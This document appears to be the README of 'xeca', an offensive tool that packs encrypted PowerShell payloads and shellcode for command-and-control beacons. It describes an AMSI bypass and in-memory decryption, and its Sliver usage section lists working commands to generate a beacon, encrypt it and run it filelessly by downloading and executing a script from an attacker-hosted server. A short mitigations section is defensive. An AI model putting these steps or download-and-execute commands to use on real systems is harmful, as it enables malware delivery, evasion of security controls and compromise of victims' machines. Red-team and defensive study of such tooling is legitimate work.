# xeca
xeca is a project that creates encrypted PowerShell payloads for offensive purposes.

Creating position independent shellcode from DLL files is also possible.

Note: Please place your custom AMSI bypass in `src/assets/amsi-bypass.ps1`.

## Table of Contents
- [xeca](#xeca)
  * [Install](#install)
  * [How It Works](#how-it-works)
  * [Mitigations](#mitigations)
  * [Examples](#examples)
    + [Covenant](#covenant)
    + [Empire](#empire)
    + [Merlin](#merlin)
    + [Sliver](#sliver)
  * [Acknowledgements](#acknowledgements)
  * [License](#license)

## Install
Firstly ensure that rust is [installed](https://www.rust-lang.org/tools/install), then build the project with the following command:
```
cargo build
```

## How It Works
1. Identify and encrypt the payload. Load encrypted payload into a powershell script and save to a file named "launch.txt"
3. The key to decrypt the payload is saved to a file named "safe.txt"
3. Execute "launch.txt" on a remote host
   - The script will call back to the attacker defined web server to retrieve the decryption key "safe.txt"
   - Decrypt the payload in memory
   - Execute the intended payload in memory

## Mitigations
If users must have access to programs such as powershell.exe, consider minimising security risks with [Just Enough Administration](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/jea/overview?view=powershell-7) and [PowerShell Logging](https://docs.microsoft.com/en-us/powershell/scripting/windows-powershell/wmf/whats-new/script-logging?view=powershell-7). Application control policies can be deployed via a whitelisting technology such as [AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/applocker-overview).

## Usage
### Sliver
1. Generate a shellcode beacon -> generate beacon --format shellcode --os windows --mtls $IP$
2. Use xeca to encrypt the payload -> xeca shellcode --shellcode $shellcode$.bin --url http://$pythonhttpserver$
3. Create a python http server with the port that you provided to xeca -> python -m http.server 8080
4. Use one of the following ways to run the payload:
    - Fileless -> iex(New-Object Net.WebClient).DownloadString("http://$pythonhttpserver$/launch.txt")
    - Run from disk -> iwr "http://$pythonhttpserver$" -OutFile launch.txt; iex(cat .\launch.txt)

The launch.txt file contains the encrypted payload, it will first run an amsi bypass, and then it will load the encrypted payload, after that it will call back to the python server and grab the "safe.txt" file which will decrypt the payload in memory.

## Acknowledgements
This tool would not be possible without the sharing of knowledge and information. Ideas, snippets and code from the following authors should be acknowledged:  
[@monoxgas](https://github.com/monoxgas)  
[@H0neyBadger](https://github.com/H0neyBadger)  
[@TheWover](https://github.com/TheWover)  
[@stephenfewer](https://github.com/stephenfewer)  
[@dismantl](https://github.com/dismantl)  
[@tandasat](https://github.com/tandasat)  
[@cobbr](https://github.com/cobbr)  

## License
xeca is licensed under [GPLv3](https://www.gnu.org/licenses/gpl-3.0.en.html), some sub-components may have separate licenses. See their respective references in this project for details.
